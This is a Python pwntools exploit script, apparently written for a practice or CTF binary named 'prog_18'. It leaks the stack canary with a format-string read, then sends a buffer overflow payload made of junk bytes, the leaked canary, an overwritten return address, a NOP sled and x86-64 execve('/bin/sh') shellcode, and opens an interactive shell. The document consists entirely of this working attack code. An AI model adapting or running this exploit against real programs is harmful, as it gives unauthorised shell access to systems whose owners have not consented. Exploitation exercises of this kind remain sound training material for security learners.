from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')

#context.log_level = 'DEBUG'

binary = ELF('prog_18')

p = process('./prog_18')

###### STAGE 1 - LEAK CANARY COOKIE ######

format1 = "%27$lx"

p.recvline()
p.sendline(format1)

leak = p.recvline()[8:].strip()

canary_cookie = int(leak, 16)

print("\n")

log.success("Canary Value: " +hex(canary_cookie))

###### END ######


###### STAGE 2 - SENDING PAYLOAD ######

print ("\n")

print (p.recvline())

esp = 0x7fffffffe4d0+200

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

buf = ""
buf += "A" * 168             #JUNK
buf += p64(canary_cookie)    #LEAKED CANARY COOKIE
buf += "CCCCCCCC"            #JUNK OVERWRITE RBP
buf += p64(esp)              #STACK PLACE
buf += "\x90" *400           #NOPS
buf += shellcode             #EXEC /BIN/SH

log.info("Sending payload [{}]" .format(buf))

print("\n")

p.sendline(buf)

p.interactive()

###### END ######

open("payload", "w").write('{}\n{}'.format(
    format1,
    buf
))


